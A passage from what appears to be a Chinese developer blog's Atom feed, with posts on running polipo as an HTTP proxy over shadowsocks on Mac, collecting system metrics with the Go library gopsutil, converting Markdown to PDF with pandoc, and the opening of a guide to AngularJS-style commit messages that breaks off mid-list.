<li>安装<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">apt-get install polipo</div><div class="line">service polipo stop</div><div class="line">polipo socksParentProxy=localhost:1080</div></pre></td></tr></table></figure>
</li>
</ul>
<p>以上是官方文档里面的说明，在mac下使用polipo要稍做修改</p>
<ul>
<li>mac的安装<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">brew install polipo</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="Polipo使用"><a href="#Polipo使用" class="headerlink" title="Polipo使用"></a>Polipo使用</h2><ul>
<li><p>ss对polipo的使用样例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">http_proxy=http://localhost:8123 apt-get update</div><div class="line"></div><div class="line">http_proxy=http://localhost:8123 curl www.google.com</div><div class="line"></div><div class="line">http_proxy=http://localhost:8123 wget www.google.com</div><div class="line"></div><div class="line">git config --global http.proxy 127.0.0.1:8123</div><div class="line">git clone https://github.com/xxx/xxx.git</div><div class="line">git xxx</div><div class="line">git xxx</div><div class="line">git config --global --unset-all http.proxy</div></pre></td></tr></table></figure>
</li>
<li><p>mac的使用<br>打开一个terminal, 不要关掉，象genymotion之类的其他程序就可使用Http代理了.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜  ~ polipo socksParentProxy=localhost:1080</div><div class="line">Established listening socket on port 8123.</div></pre></td></tr></table></figure>
</li>
</ul>
<p>然后我们使用使用该<code>http proxy</code>来安装golang包,记得开启的你的ss<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">➜  Blogs https_proxy=http://localhost:8123 go get -u -v github.com/valyala/fasthttp</div><div class="line">github.com/valyala/fasthttp (download)</div><div class="line">github.com/klauspost/compress (download)</div><div class="line">github.com/klauspost/cpuid (download)</div><div class="line">github.com/klauspost/crc32 (download)</div><div class="line">github.com/valyala/bytebufferpool (download)</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;搞这个的主要原因是golang的很多依赖包需要翻墙下载, 这不像Python和NodeJS有官方源仓库的语言(配置国内源可以加速). 之前用windows的时候也是使用ss, 而&lt;code&gt;http proxy&lt;/code&gt;是通过chrome的一个插件&lt;code&gt;Proxy SwitchyOmega&lt;/code&gt;来做的，但是在mac下面这招不灵了, 下面主要介绍mac如何利用ss搭建&lt;code&gt;http proxy&lt;/code&gt;.&lt;br&gt;
    
    </summary>
    
      <category term="开发工具" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
      <category term="Shadowsocks" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Shadowsocks/"/>
    
    
      <category term="http-proxy" scheme="https://blog.yumaojun.net/tags/http-proxy/"/>
    
  </entry>
  
  <entry>
    <title>夸平台系统监控库-gopsutils</title>
    <link href="https://blog.yumaojun.net/2017/01/22/gopsutils/"/>
    <id>https://blog.yumaojun.net/2017/01/22/gopsutils/</id>
    <published>2017-01-22T06:37:09.000Z</published>
    <updated>2017-01-24T12:37:41.000Z</updated>
    
    <content type="html"><![CDATA[<p>很欣赏<code>telegraf</code>的架构,之前也多次使用, 最近也要通过他来获取系统运行时信息然后上传,所以想借鉴下<code>telegraf</code>里面的system模块的实现，看了下他的源码，发现他使用了一个名叫<code>gopsutils</code>库来完成所有的系统数据的采集的, 于是决定手动试试这个库的功能。<br><a id="more"></a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在说<code>gopsutils</code>之前我们必须先说下<code>psutils</code>是啥, 因为<code>gopsutils</code>实际上就是一个golang版本的<code>psutils</code>(从名字上也能看出来)<br><code>psutils</code>是一个比较出名的python库, <code>psutils</code>是<code>python process and system utilities</code>的一个缩写. 它有如下特点</p>
<ul>
<li>跨平台: Linux, Windows, OSX, Sun Solaris, FreeBSD, OpenBSD and NetBSD的32位和64位系统</li>
<li>功能丰富: 实现了进程管理,系统诊断, 这个库基本实现了这些命令行工具的功能: ps, top, lsof, netstat, ifconfig, who, df, kill, free, nice, ionice, iostat, iotop, uptime, pidof, tty, taskset, pmap</li>
</ul>
<p>如果想要了解关于<code>gopsutils</code>更多的详情 请查看<a href="https://github.com/shirou/gopsutil" target="_blank" rel="external">gopsutils github地址</a></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">➜  gops_test go get  -v &quot;github.com/shirou/gopsutil&quot;</div></pre></td></tr></table></figure>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>具体的使用文档可以参考<a href="https://godoc.org/github.com/shirou/gopsutil" target="_blank" rel="external">gopsutil的godoc文档</a><br>以下以测试收集cpu, disk, load, mem, net, process 为列, 注意这些对象都使用String方法, 因此可以直接调用fmt打印，String方法会将其转换成Json输出.<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"fmt"</span></div><div class="line"></div><div class="line">	<span class="string">"github.com/shirou/gopsutil/cpu"</span></div><div class="line">	<span class="string">"github.com/shirou/gopsutil/disk"</span></div><div class="line">	<span class="string">"github.com/shirou/gopsutil/load"</span></div><div class="line">	<span class="string">"github.com/shirou/gopsutil/mem"</span></div><div class="line">	<span class="string">"github.com/shirou/gopsutil/net"</span></div><div class="line">	<span class="string">"github.com/shirou/gopsutil/process"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	fmt.Println(<span class="string">"CPU统计:"</span>)</div><div class="line">	c, _ := cpu.Info()</div><div class="line">	fmt.Println(c)</div><div class="line"></div><div class="line">	fmt.Println(<span class="string">"内存统计:"</span>)</div><div class="line">	m, _ := mem.VirtualMemory()</div><div class="line">	fmt.Println(m)</div><div class="line"></div><div class="line">	fmt.Println(<span class="string">"磁盘用量和IO统计:"</span>)</div><div class="line">	dp, _ := disk.Partitions(<span class="literal">true</span>)</div><div class="line">	du, _ := disk.Usage(<span class="string">"/"</span>)</div><div class="line">	di, _ := disk.IOCounters()</div><div class="line">	fmt.Println(du)</div><div class="line">	fmt.Println(dp)</div><div class="line">	fmt.Println(di)</div><div class="line"></div><div class="line">	fmt.Println(<span class="string">"网络IO统计:"</span>)</div><div class="line">	ni, _ := net.IOCounters(<span class="literal">true</span>)</div><div class="line">	fmt.Println(ni)</div><div class="line"></div><div class="line">	fmt.Println(<span class="string">"协议统计:"</span>)</div><div class="line">	nt, _ := net.ProtoCounters(<span class="literal">nil</span>)</div><div class="line">	fmt.Println(nt)</div><div class="line"></div><div class="line">	fmt.Println(<span class="string">"链接状态统计:"</span>)</div><div class="line">	nc, _ := net.Connections(<span class="string">"all"</span>)</div><div class="line">	fmt.Println(nc)</div><div class="line"></div><div class="line">	fmt.Println(<span class="string">"进程统计:"</span>)</div><div class="line">	pi, _ := process.Pids()</div><div class="line">	fmt.Println(pi)</div><div class="line">	p, _ := process.NewProcess(<span class="number">614</span>)</div><div class="line">	pm, _ := p.MemoryPercent()</div><div class="line">	pn, _ := p.Username()</div><div class="line">	fmt.Println(pm)</div><div class="line">	fmt.Println(pn)</div><div class="line"></div><div class="line">	fmt.Println(<span class="string">"负载统计:"</span>)</div><div class="line">	pl, _ := load.Avg()</div><div class="line">	fmt.Println(pl)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>最后执行过会的结果大概为这样:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">CPU统计:</div><div class="line">[&#123;&quot;cpu&quot;:0,&quot;vendorId&quot;:&quot;GenuineIntel&quot;,&quot;family&quot;:&quot;6&quot;,&quot;model&quot;:&quot;69&quot;,&quot;stepping&quot;:1,&quot;physicalId&quot;:&quot;&quot;,&quot;coreId&quot;:&quot;&quot;,&quot;cores&quot;:2,&quot;modelName&quot;:&quot;Intel(R) Core(TM) i5-4278U CPU @ 2.60GHz&quot;,&quot;mhz&quot;:2600,&quot;cacheSize&quot;:256,&quot;flags&quot;:[&quot;fpu&quot;,&quot;vme&quot;,&quot;de&quot;,&quot;pse&quot;,&quot;tsc&quot;,&quot;msr&quot;,&quot;pae&quot;,&quot;mce&quot;,&quot;cx8&quot;,&quot;apic&quot;,&quot;sep&quot;,&quot;mtrr&quot;,&quot;pge&quot;,&quot;mca&quot;,&quot;cmov&quot;,&quot;pat&quot;,&quot;pse36&quot;,&quot;clfsh&quot;,&quot;ds&quot;,&quot;acpi&quot;,&quot;mmx&quot;,&quot;fxsr&quot;,&quot;sse&quot;,&quot;sse2&quot;,&quot;ss&quot;,&quot;htt&quot;,&quot;tm&quot;,&quot;pbe&quot;,&quot;sse3&quot;,&quot;pclmulqdq&quot;,&quot;dtes64&quot;,&quot;mon&quot;,&quot;dscpl&quot;,&quot;vmx&quot;,&quot;est&quot;,&quot;tm2&quot;,&quot;ssse3&quot;,&quot;fma&quot;,&quot;cx16&quot;,&quot;tpr&quot;,&quot;pdcm&quot;,&quot;sse4.1&quot;,&quot;sse4.2&quot;,&quot;x2apic&quot;,&quot;movbe&quot;,&quot;popcnt&quot;,&quot;aes&quot;,&quot;pcid&quot;,&quot;xsave&quot;,&quot;osxsave&quot;,&quot;seglim64&quot;,&quot;tsctmr&quot;,&quot;avx1.0&quot;,&quot;rdrand&quot;,&quot;f16c&quot;,&quot;smep&quot;,&quot;erms&quot;,&quot;rdwrfsgs&quot;,&quot;tsc_thread_offset&quot;,&quot;bmi1&quot;,&quot;avx2&quot;,&quot;bmi2&quot;,&quot;invpcid&quot;,&quot;fpu_csds&quot;,&quot;syscall&quot;,&quot;xd&quot;,&quot;1gbpage&quot;,&quot;em64t&quot;,&quot;lahf&quot;,&quot;lzcnt&quot;,&quot;rdtscp&quot;,&quot;tsci&quot;]&#125;]</div><div class="line">内存统计:</div><div class="line">&#123;&quot;total&quot;:8589934592,&quot;available&quot;:4315959296,&quot;used&quot;:4273975296,&quot;usedPercent&quot;:49.7556209564209,&quot;free&quot;:3390992384,&quot;active&quot;:2908176384,&quot;inactive&quot;:924966912,&quot;wired&quot;:1364955136,&quot;buffers&quot;:0,&quot;cached&quot;:0,&quot;writeback&quot;:0,&quot;dirty&quot;:0,&quot;writebacktmp&quot;:0,&quot;shared&quot;:0,&quot;slab&quot;:0,&quot;pagetables&quot;:0,&quot;swapcached&quot;:0&#125;</div><div class="line">磁盘用量和IO统计:</div><div class="line">&#123;&quot;path&quot;:&quot;/&quot;,&quot;fstype&quot;:&quot;hfs&quot;,&quot;total&quot;:249769230336,&quot;free&quot;:201003577344,&quot;used&quot;:48503508992,&quot;usedPercent&quot;:19.41932916506611,&quot;inodesTotal&quot;:60978814,&quot;inodesUsed&quot;:11905675,&quot;inodesFree&quot;:49073139,&quot;inodesUsedPercent&quot;:19.524281006842802&#125;</div><div class="line">[&#123;&quot;device&quot;:&quot;/dev/disk1&quot;,&quot;mountpoint&quot;:&quot;/&quot;,&quot;fstype&quot;:&quot;hfs&quot;,&quot;opts&quot;:&quot;rw,multilabel&quot;&#125; &#123;&quot;device&quot;:&quot;devfs&quot;,&quot;mountpoint&quot;:&quot;/dev&quot;,&quot;fstype&quot;:&quot;devfs&quot;,&quot;opts&quot;:&quot;rw,suiddir,multilabel&quot;&#125; &#123;&quot;device&quot;:&quot;map -hosts&quot;,&quot;mountpoint&quot;:&quot;/net&quot;,&quot;fstype&quot;:&quot;autofs&quot;,&quot;opts&quot;:&quot;rw,nosuid,suiddir,nosymfollow,multilabel&quot;&#125; &#123;&quot;device&quot;:&quot;map auto_home&quot;,&quot;mountpoint&quot;:&quot;/home&quot;,&quot;fstype&quot;:&quot;autofs&quot;,&quot;opts&quot;:&quot;rw,suiddir,nosymfollow,multilabel&quot;&#125;]</div><div class="line">map[]</div><div class="line">网络IO统计:</div><div class="line">[&#123;&quot;name&quot;:&quot;lo0&quot;,&quot;bytesSent&quot;:22687,&quot;bytesRecv&quot;:22687,&quot;packetsSent&quot;:215,&quot;packetsRecv&quot;:215,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;gif0&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;stf0&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;en0&quot;,&quot;bytesSent&quot;:6401764,&quot;bytesRecv&quot;:120874758,&quot;packetsSent&quot;:85192,&quot;packetsRecv&quot;:87266,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;en1&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;en2&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;p2p0&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;awdl0&quot;,&quot;bytesSent&quot;:2331,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:2,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;bridg&quot;,&quot;bytesSent&quot;:342,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:1,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125;]</div><div class="line">协议统计:</div><div class="line">[]</div><div class="line">链接状态统计:</div><div class="line">[&#123;&quot;fd&quot;:13,&quot;family&quot;:2,&quot;type&quot;:2,&quot;localaddr&quot;:&#123;&quot;ip&quot;:&quot;*&quot;,&quot;port&quot;:63824&#125;,&quot;remoteaddr&quot;:&#123;&quot;ip&quot;:&quot;&quot;,&quot;port&quot;:0&#125;,&quot;status&quot;:&quot;&quot;,&quot;uids&quot;:null,&quot;pid&quot;:238&#125; &#123;&quot;fd&quot;:64,&quot;family&quot;:2,&quot;type&quot;:1,&quot;localaddr&quot;:&#123;&quot;ip&quot;:&quot;192.168.3.7&quot;,&quot;port&quot;:49224&#125;,&quot;remoteaddr&quot;:&#123;&quot;ip&quot;:&quot;191.238.172.191&quot;,&quot;port&quot;:443&#125;,&quot;status&quot;:&quot;CLOSED&quot;,&quot;uids&quot;:null,&quot;pid&quot;:394&#125;]</div><div class="line">进程统计:</div><div class="line">[1 45 46 48 49 53 54 55 62 64 65 69 70 71 73 74 76 77 79 80 81 82 83 85 88 89 93 95 96 97 98 100 101 102 105 110 118 130 133 135 136 142 143 147 149 159 168 169 170 171 172 173 174 175 179 182 183 184 185 187 188 189 190 192 195 196 197 198 200 218 219 220 226 227 229 231 232 233 237 238 239 242 243 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 265 266 267 268 269 270 271 272 273 274 276 277 278 279 280 281 282 283 284 285 286 287 289 290 291 292 294 295 296 297 299 300 302 305 307 308 311 312 314 316 317 324 325 329 339 340 342 343 344 345 346 348 360 361 362 366 367 368 371 377 386 391 392 393 394 397 423 426 427 428 429 430 433 437 443 445 446 451 452 454 455 456 461 463 469 470 474 475 477 481 483 486 487 488 511 514 554 555 624 650 711 722 723 724 725 726 727 729 736 737 741 742 743 791 866 867 878 880 883 889 516 517 518]</div><div class="line">0</div><div class="line">root</div><div class="line">负载统计:</div><div class="line">&#123;&quot;load1&quot;:1.32,&quot;load5&quot;:1.35,&quot;load15&quot;:1.31&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;很欣赏&lt;code&gt;telegraf&lt;/code&gt;的架构,之前也多次使用, 最近也要通过他来获取系统运行时信息然后上传,所以想借鉴下&lt;code&gt;telegraf&lt;/code&gt;里面的system模块的实现，看了下他的源码，发现他使用了一个名叫&lt;code&gt;gopsutils&lt;/code&gt;库来完成所有的系统数据的采集的, 于是决定手动试试这个库的功能。&lt;br&gt;
    
    </summary>
    
      <category term="开发语言" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/"/>
    
      <category term="Golang" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/Golang/"/>
    
    
      <category term="gopsutils" scheme="https://blog.yumaojun.net/tags/gopsutils/"/>
    
  </entry>
  
  <entry>
    <title>使用pandoc将markdown文档转换成pdf</title>
    <link href="https://blog.yumaojun.net/2017/01/19/markdown-to-pdf/"/>
    <id>https://blog.yumaojun.net/2017/01/19/markdown-to-pdf/</id>
    <published>2017-01-19T05:03:18.000Z</published>
    <updated>2017-01-23T05:48:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>在公司做内部分享的时候往往用ppt, 写ppt的过程中往往还有比较多的代码示例, 通常的做法就是直接截图, 其实这对使用者来说是很不友好的, 而我之前一直使用markdown写博客, 比如我这个博客, 因此就想使用MarkDown来写分享的文档, 但是MarkDown的文档并不方便内部传阅, 因此想到了一个问题: 能否用MarkDown写, 然后转换成PDF, 给同事使用？于是问了下度娘, 果然找到了一个工具: <code>Pandoc</code>, 使用下来感觉不错, 在此分享一下使用方法, 也方便以后自己查阅。<br><a id="more"></a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Pandoc是一个用haskell编写的开源文本转换工具，小巧迅速且支持格式广泛，堪称文本转换应用的瑞士军刀。支持很多种输入输出，有关Pandoc可以在其官网进行详细了解。下载页面可以<a href="https://github.com/jgm/pandoc" target="_blank" rel="external">点此进入</a>，在其中选择合适的版本即可（GitHub下载不多赘述), 至于详细的描述请看github上的说明。<br>我这里主要使用 <code>markdown</code>—-&gt;<code>pdf</code>。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>我这里仅介绍Mac下的安装, 需要安装<code>pandoc</code>和<code>LaTeX</code><br>其他平台官方有详尽的介绍, 具体请查看：<a href="http://pandoc.org/installing.html" target="_blank" rel="external">pandoc官方安装文档</a></p>
<h3 id="pandoc安装"><a href="#pandoc安装" class="headerlink" title="pandoc安装"></a>pandoc安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ brew install pandoc</div></pre></td></tr></table></figure>
<h3 id="LaTeX安装"><a href="#LaTeX安装" class="headerlink" title="LaTeX安装"></a>LaTeX安装</h3><p>因为我需要转换成pdf,还需要装<code>LaTeX</code>, 选一个Basic版本的安装即可, <code>LaTeX</code>的<a href="http://www.tug.org/mactex/morepackages.html" target="_blank" rel="external">下载地址</a></p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>简单的使用可以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ pandoc -h</div></pre></td></tr></table></figure></p>
<p>详细用法可以man查看，我这里直接给干活了,我使用庞房,这里记得选一种你系统上有的字体。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pandoc -N -s --toc --latex-engine=xelatex -V CJKmainfont=&apos;PingFang SC&apos; -V mainfont=&apos;Monaco&apos; -V geometry:margin=1in Keystone_extension.markdown  -o Keystone.pdf</div></pre></td></tr></table></figure></p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>主要是Pandoc默认是对markDown语法有扩展，如果遇到转换后的效果和预期效果不一样, 还得阅读Pandoc扩展的MarkDown语法, 这篇博客对次介绍不错<a href="http://www.cnblogs.com/baiyangcao/p/pandoc_markdown.html" target="_blank" rel="external">Pandoc中的markdown语法</a><br>我这里仅列举一个我遇到的坑，当然如果你想使用标准的MarkDown语法，也可<code>-f markdown_strict</code>。</p>
<h3 id="图片位置对应不上"><a href="#图片位置对应不上" class="headerlink" title="图片位置对应不上"></a>图片位置对应不上</h3><p>在markDown中插入的图片和Markdown里的不一样, 这里需要在图片后面添加一个<code>\</code>, 这样图片才不会换行, 这个在它扩展语法中有描述。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在公司做内部分享的时候往往用ppt, 写ppt的过程中往往还有比较多的代码示例, 通常的做法就是直接截图, 其实这对使用者来说是很不友好的, 而我之前一直使用markdown写博客, 比如我这个博客, 因此就想使用MarkDown来写分享的文档, 但是MarkDown的文档并不方便内部传阅, 因此想到了一个问题: 能否用MarkDown写, 然后转换成PDF, 给同事使用？于是问了下度娘, 果然找到了一个工具: &lt;code&gt;Pandoc&lt;/code&gt;, 使用下来感觉不错, 在此分享一下使用方法, 也方便以后自己查阅。&lt;br&gt;
    
    </summary>
    
      <category term="文档工具" scheme="https://blog.yumaojun.net/categories/%E6%96%87%E6%A1%A3%E5%B7%A5%E5%85%B7/"/>
    
      <category term="pandoc" scheme="https://blog.yumaojun.net/categories/%E6%96%87%E6%A1%A3%E5%B7%A5%E5%85%B7/pandoc/"/>
    
    
  </entry>
  
  <entry>
    <title>commit message编写规范</title>
    <link href="https://blog.yumaojun.net/2017/01/17/commit-message-style/"/>
    <id>https://blog.yumaojun.net/2017/01/17/commit-message-style/</id>
    <published>2017-01-17T03:09:22.000Z</published>
    <updated>2017-01-17T06:11:50.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://oiw1gzfww.bkt.clouddn.com/angular-commit-message.png" alt=""><br><a id="more"></a><br>Git每次提交代码，都要写<code>Commit message</code>(提交说明)，否则就不允许提交, <code>Commit message</code>往往会用于生成<code>Change log</code>文档, 规范的<code>Commit message</code>是一个高质量项目基本要求。社区有多种<code>Commit message</code>的写法规范。其中以国际知名项目<code>AngularJS</code>的规范使用最为广泛, 因为其比较合理和系统化,并且有相应的配套工具。</p>
<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>格式化得<code>Commit message</code>有很多好处</p>
<ul>
<li><p>提供更多的历史信息，方便快速浏览</p>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ git <span class="built_in">log</span> &lt;last tag&gt; HEAD --pretty=format:%s</div><div class="line">添加testcase</div><div class="line">添加ignore格式</div><div class="line">添加py2支持</div><div class="line">补充entry_points</div><div class="line">添加测试环境文件</div><div class="line">添加tox测试相关文件</div></pre></td></tr></table></figure>
</li>
<li><p>可以过滤某些commit（比如文档改动），便于快速查找信息</p>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">log</span> HEAD --grep <span class="string">'添加'</span></div><div class="line">commit dfedec2ca55bc57137e1ffe430f9f7216d912ca0</div><div class="line">Merge: 5fcae1d f5c5120</div><div class="line">Author: 紫川秀 &lt;719118794@qq.com&gt;</div><div class="line">Date:   Mon Jan 9 19:13:47 2017 +0800</div><div class="line"></div><div class="line">    Merge pull request <span class="comment">#1 from huang75961/master</span></div><div class="line"></div><div class="line">    添加tox测试</div><div class="line"></div><div class="line">commit f5c5120ac5bb43529bd2eb9e83ccef023450a8a5</div><div class="line">Author: hc &lt;409438984@qq.com&gt;</div><div class="line">Date:   Mon Jan 9 19:00:32 2017 +0800</div><div class="line"></div><div class="line">    添加testcase</div></pre></td></tr></table></figure>
</li>
<li><p>可以直接从commit生成Change log<br>  这个需要配合后面的工具使用</p>
</li>
</ul>
<h2 id="规范"><a href="#规范" class="headerlink" title="规范"></a>规范</h2><p>每次提交，Commit message 都包括三个部分：Header，Body 和 Footer。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;<span class="built_in">type</span>&gt;(&lt;scope&gt;): &lt;subject&gt;</div><div class="line"></div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">&lt;footer&gt;</div></pre></td></tr></table></figure></p>
<p>其中，Header 是必需的，Body 和 Footer 可以省略。不管是哪一个部分，任何一行都不得超过72个字符（或100个字符）。这是为了避免自动换行影响美观。</p>
<h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>Header部分只有一行，包括三个字段：type（必需）、scope（可选）和subject（必需）。</p>
<h4 id="type"><a href="#type" class="headerlink" title="type"></a>type</h4><p>用于说明<code>commit</code>的类别，只允许使用下面7个标识</p>
<ul>
<li>feat：新功能（feature）</li>
<li>fix：修补bug</li>
<li>docs：文档（documentation）</li>
<li>style： 格式（不影响代码运行的变动）</li>
<li>refactor：重构（即不是新增功能，也不是修改bug的代码变动）</li>
<li>test：增加测试</li>
<li>chore：构建过程或辅助工具的变动</li>
</ul>
<p>如果type为<code>feat</code>和<code>fix</code>，则该commit将肯定出现在<code>Change log</code>之中。其他情况（docs、chore、style、refactor、test）由你决定，要不要放入<code>Change log</code>，建议是不要。</p>
<h4 id="scope"><a href="#scope" class="headerlink" title="scope"></a>scope</h4><p>scope用于说明 commit 影响的范围，比如数据层、控制层、视图层等等，视项目不同而不同</p>
<h4 id="subject"><a href="#subject" class="headerlink" title="subject"></a>subject</h4><p>subject是 commit 目的的简短描述，不超过50个字符。</p>
<ul>
<li>以动词开头，使用第一人称现在时，比如change，而不是changed或changes</li>
<li>第一个字母小写</li>
<li>结尾不加句号（.）</li>
</ul>
<h3 id="Body"><a href="#Body" class="headerlink" title="Body"></a>Body</h3><p>Body 部分是对本次 commit 的详细描述，可以分成多行。但是有两个注意点。</p>
<ul>
<li>使用第一人称现在时，比如使用change而不是changed或changes。</li>
